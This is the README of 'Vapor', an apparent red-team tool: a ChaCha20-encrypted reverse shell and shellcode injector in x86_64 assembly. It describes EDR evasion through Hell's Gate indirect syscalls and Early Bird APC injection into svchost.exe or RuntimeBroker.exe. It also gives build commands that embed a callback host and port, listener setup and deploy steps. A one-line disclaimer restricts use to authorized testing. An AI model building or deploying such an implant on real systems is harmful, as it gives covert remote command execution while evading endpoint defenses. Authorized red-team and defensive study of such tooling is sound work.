<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Vapor/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Vapor/main/docs/assets/logo-light.svg">
  <img alt="Vapor" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Vapor/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Assembly](https://img.shields.io/badge/language-Assembly-6E4C13.svg)
![Platform](https://img.shields.io/badge/platform-Windows%20x86__64-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**ChaCha20-Poly1305 encrypted reverse shell and process injector in pure x86_64 NASM assembly.**

Hell's Gate syscalls. PEB-walk API resolution. ~3.6 KB position-independent shellcode. Zero imports, zero dependencies.

> **Authorization Required** — Designed exclusively for authorized security testing with explicit written permission.

[Features](#features) · [Quick Start](#quick-start) · [Architecture](#architecture) · [Security](#security)

</div>

---

## Features

### ChaCha20-Poly1305 AEAD

Full RFC 8439 authenticated encryption implemented in pure assembly. 256-bit pre-shared key, fresh 12-byte random nonce per message via `SystemFunction036`. Tampered payloads silently rejected.

```bash
# Build with random PSK — prints the listener command
./build.sh 10.10.14.1 443

# Or specify your own 256-bit key
./build.sh 10.10.14.1 443 <64-char-hex>
```

### Hell's Gate + Indirect Syscalls

Syscall numbers extracted at runtime from ntdll stubs. Halo's Gate fallback for hooked functions. All NT syscalls execute via an indirect gadget found in ntdll — the return address traces back to ntdll, not the injector.

```
NtAllocateVirtualMemory → allocate RW in target
NtWriteVirtualMemory    → write shellcode
NtProtectVirtualMemory  → flip RW → RX
NtQueueApcThread        → queue APC to suspended thread
NtResumeThread          → trigger execution
```

### Process Injection

Early Bird APC injection into a suspended process. Shellcode fires before the entry point — before EDR userland hooks initialize. Default target: `RuntimeBroker.exe`.

```bash
make LHOST=10.10.14.1 LPORT=443 KEY=<key> TARGET="C:\Windows\System32\svchost.exe" all
```

### Encrypted Reverse Shell

Piped command execution via `CreateProcessA` with `cmd.exe /c`. Stdout and stderr captured through anonymous pipes with `PeekNamedPipe` polling and 30-second timeout.

```bash
# Start listener
python3 listener.py --lport 443 --key <key>

# Deploy vapor.exe or inject vapor.bin
```

### Zero Dependencies

No DLL imports. Every API — kernel32, ws2_32, advapi32 — resolved dynamically from the PEB via ror13 hash matching. Nothing to link, nothing to install on the target. The entire implant fits in ~3,600 bytes.

---

## Quick Start

### Prerequisites

| Tool | Purpose |
|------|---------|
| NASM | x86_64 assembler |
| MinGW-w64 | Linker (`x86_64-w64-mingw32-ld`) |
| Python 3.8+ | Listener and build script |
| `cryptography` | `pip install cryptography` |

### Build

```bash
git clone https://github.com/Real-Fruit-Snacks/Vapor.git
cd Vapor
./build.sh 10.10.14.1 443
```

### Deploy

```bash
# Direct execution
.\vapor.exe

# Or inject via the injector (embeds vapor.bin at build time)
.\injector.exe
```

### Wire Protocol

```
┌──────────┬──────────────┬────────────────┬──────────┐
│ len (4B) │ nonce (12B)  │ ciphertext (N) │ mac (16B)│
│ LE u32   │ random       │ ChaCha20       │ Poly1305 │
└──────────┴──────────────┴────────────────┴──────────┘
```

---

## Architecture

```
vapor/
├── vapor.asm        # Implant — ~1636 lines x86_64 NASM
├── injector.asm     # Hell's Gate + indirect syscall injector
├── listener.py      # Python listener with interactive CLI
├── build.sh         # One-command build (key gen + assemble)
└── Makefile         # NASM + ld build targets
```

| Layer | Implementation |
|-------|----------------|
| Transport | Raw TCP via `WSASocketA` / `connect` |
| Encryption | ChaCha20-Poly1305 AEAD (RFC 8439) |
| API Resolution | PEB walk, ror13 hash matching |
| Execution | `CreateProcessA` with piped I/O |
| Injection | Hell's Gate SSN + Early Bird APC |

### Build Outputs

| File | Size | Format |
|------|------|--------|
| `vapor.bin` | ~3.6 KB | Raw PIC shellcode |
| `vapor.exe` | ~4 KB | Minimal PE |
| `injector.exe` | ~8 KB | PE with embedded shellcode |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Vapor/security/advisories). Do not open public issues for security bugs.

**What Vapor does:** authenticated encryption, runtime API resolution, indirect syscalls, Early Bird injection.

**What Vapor does not do:** evade kernel monitoring (ETW), bypass AMSI, persist across reboots, exfiltrate outside the command channel, obfuscate connection metadata.

---

## License

[MIT](LICENSE) — Copyright 2026 Real-Fruit-Snacks
